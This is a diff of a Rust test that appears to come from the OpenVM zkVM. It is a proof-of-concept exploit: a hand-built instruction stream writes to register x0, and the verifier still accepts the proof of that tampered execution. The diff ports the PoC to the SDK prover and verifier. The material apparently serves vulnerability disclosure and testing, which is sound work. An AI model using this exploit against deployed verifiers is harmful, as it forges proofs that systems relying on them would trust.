@@ -398,89 +398,75 @@ mod tests {
 
     #[test]
     fn test_e2e_x0_tamper_substitution_poc() -> Result<()> {
-        use openvm_circuit::arch::{
-            verify_single, SingleSegmentVmProver, VirtualMachine, VmInstance,
-        };
         use openvm_instructions::{
-            exe::VmExe, instruction::Instruction, program::Program, riscv::RV32_REGISTER_AS,
-            SystemOpcode
+            instruction::Instruction, program::Program, riscv::RV32_REGISTER_AS, SystemOpcode,
         };
-        use openvm_rv32im_circuit::Rv32ImBuilder;
         use openvm_rv32im_transpiler::{BaseAluOpcode, Rv32AuipcOpcode};
-        use openvm_stark_sdk::config::baby_bear_poseidon2::BabyBearPoseidon2Engine;
+        use openvm_sdk::{config::AppConfig, prover::verify_app_proof, Sdk, StdIn};
         use openvm_stark_sdk::openvm_stark_backend::p3_field::FieldAlgebra;
 
-        // --- 1. Setup Environment ---
-        let mut config = test_rv32im_config();
-        // Force single-segment mode to exploit the Verifier identity gap
-        config.rv32i.system.continuation_enabled = false;
+        // --- 1. Setup Environment via SDK ---
+        // Use the standard RISC-V 32 configuration from the SDK
+        let mut app_config = AppConfig::riscv32();
+        // Ensure continuation is enabled and segment size is small for the test
+        app_config.app_vm_config.system.config = app_config
+            .app_vm_config
+            .system
+            .config
+            .with_max_segment_len(256)
+            .with_continuations();
 
-        // Use the standard BabyBear + Poseidon2 engine
-        let engine = BabyBearPoseidon2Engine::new(FriParameters::standard_fast());
-
-        // Generate Proving Key and VM instance
-        let (vm, pk) = VirtualMachine::new_with_keygen(engine, Rv32ImBuilder, config)?;
+        let sdk = Sdk::new(app_config)?;
+        let app_vk = sdk.app_pk().get_app_vk();
 
         // --- 2. Construct Malicious Instruction Stream ---
-        // Bypassing the Transpiler to inject instructions that hardware would forbid.
-        let malicious_instructions = vec![
+        let instructions = vec![
             // Instruction 1: AUIPC x0, 0x12345
-            // Result: x0 = current_pc + 0x12345000.
-            // The circuit adapter for AUIPC does not check if rd == x0.
             Instruction::new(
                 Rv32AuipcOpcode::AUIPC.global_opcode(),
-                F::ZERO, // rd = 0 (x0)
+                F::ZERO, // rd = x0
                 F::ZERO,
                 F::from_canonical_u32(0x12345),
-                F::from_canonical_u32(RV32_REGISTER_AS), // d = 1 (Register AS)
+                F::from_canonical_u32(RV32_REGISTER_AS),
                 F::ZERO,
                 F::ZERO,
                 F::ZERO,
             ),
-            // Instruction 2: ADD a0, x0, x0
-            // Result: a0 = 0x01234500 + 0x01234500 = 0x2468A00.
-            // (Standard RISC-V would expect 0x2468A000, but OpenVM shifts by 8 bits).
-            // If x0 were properly constrained to 0, a0 would be 0.
+            // Instruction 2: ADD a0, x0, 0
             Instruction::new(
                 BaseAluOpcode::ADD.global_opcode(),
-                F::from_canonical_u32(10 * 4), // rd = a0 (x10 register, byte offset 40)
+                F::from_canonical_u32(10 * 4), // rd = a0
                 F::ZERO,                       // rs1 = x0
-                F::ZERO,                       // rs2 = x0 (pointer)
-                F::from_canonical_u32(RV32_REGISTER_AS), // d = 1
-                F::ONE,                        // e = 1 (rs2 is a register)
+                F::ZERO,                       // rs2 = x0
+                F::from_canonical_u32(RV32_REGISTER_AS),
+                F::ONE,
                 F::ZERO,
                 F::ZERO,
             ),
             Instruction::from_usize(SystemOpcode::TERMINATE.global_opcode(), [0, 0, 0]),
         ];
 
-        let program = Program::from_instructions(&malicious_instructions);
-        let cached_program_trace = vm.commit_program_on_device(&program);
-        let exe = Arc::new(VmExe::new(program));
+        let malicious_program = Program::from_instructions(&instructions);
+        let malicious_exe = Arc::new(VmExe::new(malicious_program));
 
-        // --- 3. Prover Generation ---
-        let mut prover_instance = VmInstance::new(vm, exe, cached_program_trace)?;
+        // --- 4. Prover Generation via SDK ---
+        let mut app_prover = sdk.app_prover(malicious_exe)?;
+        let proof = app_prover.prove(StdIn::default())?;
 
-        // Use dummy trace heights for the small program (mimicking integration_test.rs)
-        let trace_heights = vec![256; pk.per_air.len()];
-        let proof = SingleSegmentVmProver::prove(&mut prover_instance, vec![], &trace_heights)?;
-
-        // Verify that x10 (a0) was indeed corrupted in the state before finalizing the proof
-        let final_state = prover_instance.state().as_ref().unwrap();
-        let a0_val = unsafe { final_state.memory.read::<u8, 4>(RV32_REGISTER_AS, 40) };
-        assert_eq!(
-            u32::from_le_bytes(a0_val),
-            0x2468A00,
-            "Soundness Failure: a0 should have been 0 but is 0x2468A00"
-        );
-
-        // --- 4. Verification Substitution Attack ---
+        // --- 5. The "Realization": Verification succeeds against the SDK verifier ---
         // THE VULNERABILITY: verification succeeds!
-        // legitimate_vk is config-wide, and verify_single doesn't check the program hash.
-        verify_single(&prover_instance.vm.engine, &pk.get_vk(), &proof)?;
+        verify_app_proof(&app_vk, &proof)?;
 
-        println!("POC SUCCESS: Deceived Verifier with tampered x0 and substituted code!");
+        let final_state = app_prover.instance().state().as_ref().unwrap();
+        let a0_bytes = unsafe { final_state.memory.read::<u8, 4>(RV32_REGISTER_AS, 40) };
+        let a0_u32 = u32::from_le_bytes(a0_bytes);
 
+        assert_eq!(
+            a0_u32,
+            0x2468a00,
+            "Soundness Failure: x0 was not corrupted!"
+        );
+        println!("POC SUCCESS: Realized x0 soundness bug with hijacked prover!");
         Ok(())
     }
 }
